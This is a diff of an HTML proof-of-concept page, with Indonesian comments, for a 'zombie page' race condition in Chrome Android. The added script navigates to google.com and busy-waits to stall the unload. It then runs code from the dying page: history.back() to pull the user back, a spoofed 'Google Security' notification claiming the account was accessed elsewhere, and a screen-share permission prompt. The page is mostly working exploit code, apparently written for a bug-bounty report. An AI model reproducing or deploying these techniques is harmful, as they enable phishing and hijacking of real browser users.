@@ -1,36 +1,100 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-    <title>Zombie Page Test - VulnVoyagers</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PoC Zombie Page - FARISSAL B</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding: 50px; background: #f4f4f4; }
+        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
+        button { background: #1a73e8; color: white; border: none; padding: 15px 30px; border-radius: 5px; cursor: pointer; font-size: 16px; }
+        button:hover { background: #1557b0; }
+        #log { margin-top: 20px; color: #666; font-size: 12px; text-align: left; background: #eee; padding: 10px; border-radius: 5px; display: none; }
+    </style>
 </head>
 <body>
-    <h1>Zombie Page Race Condition Test</h1>
-    <p>Klik tombol di bawah, lalu tunggu 2 detik.</p>
-    <button id="start">Mulai Navigasi & Hijack</button>
 
-    <script>
-        document.getElementById('start').onclick = () => {
-            console.log("[*] Memulai navigasi ke Google...");
-            
-            // 1. Trigger navigasi ke website lain (Cross-Origin)
-            location.href = "https://www.google.com";
+<div class="card">
+    <h1>Chrome Zombie Page Hijack</h1>
+    <p>Target: Chrome Android Stable (Tecno Pova 7)</p>
+    
+    <button onclick="requestPerms()">1. Izinkan Notifikasi</button><br><br>
+    
+    <button id="attackBtn" style="display:none;">2. Jalankan Attack!</button>
 
-            // 2. BUSY-SLEEP: Kita bikin CPU macet selama 2 detik
-            // Ini tujuannya nahan proses 'unload' di background
-            const start = Date.now();
-            while (Date.now() - start < 2000) {
-                // Loop kosong buat makan resource CPU
+    <div id="log"></div>
+</div>
+
+<script>
+    const attackBtn = document.getElementById('attackBtn');
+    const logDiv = document.getElementById('log');
+
+    function logger(msg) {
+        logDiv.style.display = 'block';
+        logDiv.innerHTML += `> ${msg}<br>`;
+        console.log(msg);
+    }
+
+    async function requestPerms() {
+        const perm = await Notification.requestPermission();
+        if (perm === "granted") {
+            alert("Izin diberikan! Sekarang klik tombol Attack.");
+            attackBtn.style.display = "inline-block";
+        } else {
+            alert("Waduh, izin ditolak. Reset site settings dulu ya.");
+        }
+    }
+
+    attackBtn.onclick = function() {
+        logger("Memulai navigasi ke google.com...");
+
+        // TRIGGER NAVIGASI
+        // Kita pindah ke origin yang berbeda (Cross-Origin)
+        location.href = "https://www.google.com";
+
+        // BUSY-SLEEP (The Core Exploit)
+        // Kita blokir thread utama selama 2.5 detik.
+        // Di Tecno Pova lo, coba mainin angka ini (1000 - 3000)
+        logger("Nahan proses 'unload' (Busy-Sleep)...");
+        const delay = 2500; 
+        const start = Date.now();
+        while (Date.now() - start < delay) {
+            // Loop ini bikin CPU HP lo sibuk nahan halaman biar gak 'mati'
+        }
+
+        // SET TIMEOUT DI LUAR LIFE-CYCLE NORMAL
+        // Perintah ini bakal dieksekusi pas browser 'ngira' halaman udah mati
+        setTimeout(() => {
+            // 1. Mencoba Hijack History (Balik ke halaman kita)
+            // Kalau ini sukses, lo bakal balik dari Google ke sini otomatis
+            history.back();
+            logger("History.back() dikirim dari 'alam kubur'!");
+
+            // 2. Mencoba Notifikasi Palsu
+            // Seharusnya ini muncul pas lo udah di halaman Google
+            new Notification("Google Security", {
+                body: "Akun anda terdeteksi login di perangkat lain. Klik untuk amankan.",
+                icon: "https://www.google.com/favicon.ico",
+                tag: "spoof"
+            });
+            logger("Notification spoof terkirim!");
+
+            // 3. Mencoba panggil Popup (The $2.000 Bug)
+            if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
+                navigator.mediaDevices.getDisplayMedia({video: true})
+                .then(() => logger("Popup Screenshare BERHASIL MUNCUL!"))
+                .catch(() => logger("Popup gagal/ditolak."));
             }
+        }, 500); 
+    };
 
-            // 3. THE HIJACK: Setelah navigasi 'seharusnya' selesai, 
-            // kita coba perintah history dari halaman yang 'mati' ini.
-            setTimeout(() => {
-                console.log("[!] Mencoba menarik balik history...");
-                // Jika berhasil, meskipun lo udah di Google, 
-                // lo bakal dipaksa balik lagi ke halaman ini.
-                history.back(); 
-            }, 500);
-        };
-    </script>
+    // Deteksi kalau halaman masuk BFCache
+    window.addEventListener('pagehide', (event) => {
+        if (event.persisted) {
+            logger("Halaman masuk BFCache (Zombie mode aktif).");
+        }
+    });
+</script>
+
 </body>
 </html>
